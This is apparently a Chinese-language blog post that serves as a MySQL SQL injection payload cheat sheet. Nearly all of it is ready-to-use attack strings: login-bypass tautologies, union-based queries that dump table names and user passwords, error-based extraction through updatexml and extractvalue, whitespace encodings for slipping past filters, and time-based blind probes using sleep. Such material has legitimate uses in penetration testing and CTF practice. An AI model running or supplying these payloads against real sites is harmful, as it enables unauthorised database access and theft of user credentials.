---
title: Misc-sql-injection
author: AmtuOrRF
categories: [Misc]
tags: [Misc]
---


基于mysql的一些sql注入payload

### sql注入注释
```mysql
#
-- -
--+-
/*xx*/
```
### mysql查询
```mysql
select schema_name from information_schema.schemata;

select table_name from information_schema.tables;
select table_name from information_schema.tables where table_schema=database();

select column_name from information_schema.columns;
select column_name from information_schema.columns where table_schema=database();
select column_name from information_schema.columns where table_name='user';
select column_name from information_schema.columns where table_name='user' and table_schema=database();
```

### 常用判断注入方法
```bash

1' or '1'='1
1' or '1'='1'
1' or '1'='1'--
' or 1=1 --
a' or 1=1 --
" or 1=1 --
a" or 1=1 --
' or 1=1 #
" or 1=1 #
or 1=1 --
' or 'x'='x
" or "x"="x
') or ('x'='x
") or ("x"="x


# 使用时间延迟查找可注入参数
';WAITFOR DELAY '0:0:5'--
```

### 判断字段
```mysql
 order by 1
 order by 2
 order by 3
...
 union select 1
 union select 1,2
 union select 1,2,3
 union select 1,2,3,4

 union select 1 from xxx
 union select 1,2 from xxx
 union select 1,2,3 from xxx
```

### 联合查询注入
```mysql
'1' order by 2--+-
'1' union select 1,2--+-

# 查询当前数据库的表
'1' union select 1,table_name from information_schema.tables where table_schema=database()--+-
'1' union select 1,concat(table_name) from information_schema.tables where table_schema=database()--+-
'1' union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()--+-

# 查询users表内的字段
'1' union select 1,column_name from information_schema.columns where table_name='users'--+-
'1' union select 1,concat(column_name) from information_schema.columns where table_name='users'--+-
'1' union select 1,group_concat(column_name) from information_schema.columns where table_name='users'--+-
# 也可以为16进制
'1' union select 1,column_name from information_schema.columns where table_name=0x7573657273--+-

# 查数据
'1' union select user_id,password from users--+-
'1' union select user,group_concat(user_id,password) from users--+-



select(group_concat(user_id,password))from(users);
select(group_concat(user_id,password))from(users)where(user_id=1);
```
### 报错注入
报错注入需要使用到的函数 ExtractValue() 和 updatexml()
```mysql
# 报错获取当前数据库
'1' and updatexml(1,concat(0x5e,(database()),0x5e),1)--+-
'1' and updatexml(1,concat(0x5e,(select(database())),0x5e),1)--+-

'1' and extractvalue(1,concat(0x5e,(select database()),0x5e))--+-
'1' and extractvalue(1,concat(0x5e,(select(database())),0x5e))--+-

# 报错注入有些也可以使用^
'1'^updatexml(1,concat(0x5e,(database()),0x5e),1)--+-
'1'^updatexml(1,concat(0x5e,(select(database())),0x5e),1)--+-

'1'^extractvalue(1,concat(0x5e,(select database()),0x5e))--+-
'1'^extractvalue(1,concat(0x5e,(select(database())),0x5e))--+-

# 获取tables 表
# 如果出现 回显'ubquery returns more than 1 row' 字样，就需要使用 limit来分页，或者使用group_concat()
'1' and updatexml(1,concat(0x5e,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x5e),1)--+-
'1' and updatexml(1,concat(0x5e,(select table_name from information_schema.tables where table_schema=database() limit 1,1),0x5e),1)--+-
'1' and updatexml(1,concat(0x5e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x5e),1)--+-
'1' and updatexml(1,concat(0x5e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),0x5e),1)--+-
'1'^updatexml(1,concat(0x5e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),0x5e),1)--+-


'1' and extractvalue(1,concat(0x5e,(select table_name from information_schema.tables where table_schema=database()),0x5e))--+-
'1' and extractvalue(1,concat(0x5e,(select table_name from information_schema.tables where table_schema=database() limit 1,1),0x5e))--+-
'1' and extractvalue(1,concat(0x5e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x5e))--+-
'1' and extractvalue(1,concat(0x5e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),0x5e))--+-
'1'^extractvalue(1,concat(0x5e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),0x5e))--+-

# 获取表的字段
'1' and updatexml(1,concat(0x5e,(select column_name from information_schema.columns where table_name='users' limit 0,1),0x5e),1)--+-
'1' and updatexml(1,concat(0x5e,(select column_name from information_schema.columns where table_name='users' limit 1,1),0x5e),1)--+-
'1' and updatexml(1,concat(0x5e,(select concat(column_name) from information_schema.columns where table_name='users' limit 1,1),0x5e),1)--+-
'1' and updatexml(1,concat(0x5e,(select group_concat(column_name) from information_schema.columns where table_name='users'),0x5e),1)--+-
# concat只能存32个，
'1' and updatexml(1,concat(0x5e,substr((select group_concat(column_name) from information_schema.columns where table_name='users'),1,30),0x5e),1)--+-
'1' and updatexml(1,concat(0x5e,substr((select group_concat(column_name) from information_schema.columns where table_name='users'),31,60),0x5e),1)--+-




# 获取数据
'1' and extractvalue(1,concat(0x5e,(select id from users),0x5e))--+-
'1' and extractvalue(1,concat(0x5e,(select(id)from(users)),0x5e))--+-

'1' and extractvalue(1,concat(0x5e,(select(id)from(users)limit 1),0x5e))--+-
'1' and extractvalue(1,concat(0x5e,(select(id)from(users)limit 1,1),0x5e))--+-

```

### 代替空格
```python
# 空格代替
%09 TAB键（水平）
%0a 新建一行,回车
%0b TAB键（垂直）
%0c 新的一页
%0d return功能
%a0 (window部分无法实现)
%27 单引号
/**/
tab
两个空格
%0A  大小写
```
```mysql
# %09
'1'%09or%091=1--+-
'1'%09and%091=1--+-

# %0a
'1'%0aor%0a1=1--+-
'1'%0aand%0a1=1--+-

# %0d
'1'%0dor%0d1=1--+-
'1'%0dand%0d1=1--+-

# %0c
'1'%0cor%0c1=1--+-
'1'%0cand%0c1=1--+-

# %0b
'1'%0bor%0b1=1--+-
'1'%0band%0b1=1--+-

# /*a*/
'1'/*a*/or/*a*/1=1--+-
'1'/*a*/and/*a*/1=1--+-

```



### if sleep注入(时间盲注)
> 判断正确的时候会立即返回，判断错误的时候会延迟5秒

判断长度:
```mysql
# 不延迟
'1' and if(length(database())>1,0,sleep(5))--+-
'1' and if(length((select group_concat(table_name) from information_schema.tables where table_schema=database()))>1,0,sleep(5))--+-

# 延迟
'1' and if(length(database())<1,0,sleep(5))--+-
'1' and if(length((select group_concat(table_name) from information_schema.tables where table_schema=database()))<1,0,sleep(5))--+-
```